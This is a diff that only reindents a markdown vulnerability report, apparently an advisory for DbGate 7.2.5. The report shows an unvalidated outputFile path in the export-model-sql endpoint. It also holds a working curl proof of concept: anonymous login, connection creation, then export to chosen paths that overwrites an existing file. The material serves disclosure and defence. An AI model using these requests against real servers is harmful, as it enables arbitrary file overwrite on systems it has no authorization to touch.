@@ -22,11 +22,11 @@ In `packages/api/src/controllers/databaseConnections.js`:
 ```javascript
 exportModelSql_meta: true,
 async exportModelSql({ conid, database, outputFolder, outputFile, schema }, req) {
-    const driver = await this.getDriver({ conid });
-    const structure = await this.structure({ conid, database });
-    const model = schema ? filterBySchema(structure, schema) : structure;
-    await exportDbModelSql(extendDatabaseInfo(model), driver, outputFolder, outputFile);
-    return { status: 'ok' };
+ const driver = await this.getDriver({ conid });
+ const structure = await this.structure({ conid, database });
+ const model = schema ? filterBySchema(structure, schema) : structure;
+ await exportDbModelSql(extendDatabaseInfo(model), driver, outputFolder, outputFile);
+ return { status: 'ok' };
 }
 ```
 
@@ -34,8 +34,8 @@ In `packages/api/src/utility/exportDbModelSql.js`:
 
 ```javascript
 async function exportDbModelSql(dbModel, driver, outputFolder, outputFile) {
-    const script = generateSqlScript(dbModel, driver);
-    fs.writeFile(outputFile, script);  // outputFile is user-controlled, no validation!
+ const script = generateSqlScript(dbModel, driver);
+ fs.writeFile(outputFile, script); // outputFile is user-controlled, no validation!
 }
 ```
 
@@ -49,17 +49,17 @@ Verified on DbGate 7.2.5 Docker (default anonymous deployment, port 3000):
 
 ```bash
 curl -s -X POST http://TARGET:3000/auth/login \
-  -H "Content-Type: application/json" \
-  -d '{"amoid":"none"}'
+ -H "Content-Type: application/json" \
+ -d '{"amoid":"none"}'
 ```
 
 **Step 2: Create a SQLite database connection (to obtain a valid `conid`)**
 
 ```bash
 curl -s -X POST http://TARGET:3000/connections/new-sqlite-database \
-  -H "Authorization: Bearer <JWT>" \
-  -H "Content-Type: application/json" \
-  -d '{"file":"pocdb"}'
+ -H "Authorization: Bearer <JWT>" \
+ -H "Content-Type: application/json" \
+ -d '{"file":"pocdb"}'
 ```
 ```
 {"engine":"sqlite@dbgate-plugin-sqlite","databaseFile":"/root/.dbgate/files/sqlite/pocdb.sqlite","singleDatabase":true,"defaultDatabase":"pocdb.sqlite","_id":"d6818e33-a0b6-4645-bebb-a3ffe4730ee2"}
@@ -69,9 +69,9 @@ curl -s -X POST http://TARGET:3000/connections/new-sqlite-database \
 
 ```bash
 curl -s -X POST http://TARGET:3000/database-connections/export-model-sql \
-  -H "Authorization: Bearer <JWT>" \
-  -H "Content-Type: application/json" \
-  -d '{"conid":"d6818e33-a0b6-4645-bebb-a3ffe4730ee2","database":"pocdb.sqlite","outputFile":"/tmp/export_with_content.sql"}'
+ -H "Authorization: Bearer <JWT>" \
+ -H "Content-Type: application/json" \
+ -d '{"conid":"d6818e33-a0b6-4645-bebb-a3ffe4730ee2","database":"pocdb.sqlite","outputFile":"/tmp/export_with_content.sql"}'
 ```
 ```
 {"status":"ok"}
@@ -80,10 +80,10 @@ curl -s -X POST http://TARGET:3000/database-connections/export-model-sql \
 ```
 $ cat /tmp/export_with_content.sql
 CREATE TABLE [users] (
-  [id] INTEGER NULL,
-  [name] TEXT NULL,
-  [email] TEXT NULL,
-   PRIMARY KEY ([id])
+ [id] INTEGER NULL,
+ [name] TEXT NULL,
+ [email] TEXT NULL,
+ PRIMARY KEY ([id])
 );
 ```
 
@@ -95,9 +95,9 @@ echo "ORIGINAL_CONTENT" > /tmp/marker_file.txt
 
 # Overwrite it via export-model-sql
 curl -s -X POST http://TARGET:3000/database-connections/export-model-sql \
-  -H "Authorization: Bearer <JWT>" \
-  -H "Content-Type: application/json" \
-  -d '{"conid":"d6818e33-a0b6-4645-bebb-a3ffe4730ee2","database":"pocdb.sqlite","outputFile":"/tmp/marker_file.txt"}'
+ -H "Authorization: Bearer <JWT>" \
+ -H "Content-Type: application/json" \
+ -d '{"conid":"d6818e33-a0b6-4645-bebb-a3ffe4730ee2","database":"pocdb.sqlite","outputFile":"/tmp/marker_file.txt"}'
 ```
 ```
 {"status":"ok"}
